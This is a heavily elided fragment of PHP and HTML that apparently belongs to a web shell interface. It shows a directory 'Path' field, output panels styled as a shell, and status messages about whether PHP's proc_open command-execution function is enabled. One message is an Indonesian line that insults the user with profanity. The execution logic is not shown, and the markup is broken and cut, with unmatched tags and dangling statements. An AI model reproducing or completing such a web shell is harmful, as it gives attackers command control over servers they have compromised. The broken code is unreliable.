...
<body class="bg-info">
   ...
   <div class="container">
      <div class="row justify-content-center mt-5">
         <div class="md-4">
            <label for="dir" class="font-weight-bold text-dark">Path :</label>
            <?php
           ...
           <div class='mb-3'>
               ...
               <div class="container-fluid language-javascript">
                   <div class="shell mb-3">
                       <pre style="font-size:15px;"><code></code>Kalo gak muncul, itu antara lu typo kalo nggak poc_open nya off kontol!</pre>
                   </div>
               </div>
           </div>';
           endif;
      ...
      ?>
         ...
         <?php
            ...
            <div class='mb-3'>
                ...
                <div class="container-fluid language-javascript">
                    <div class="shell mb-3">
                        <pre style="font-size:10px;"><code>proc_open is disable!</code></pre>
                    </div>
                </div>
            </div>';
            endif;
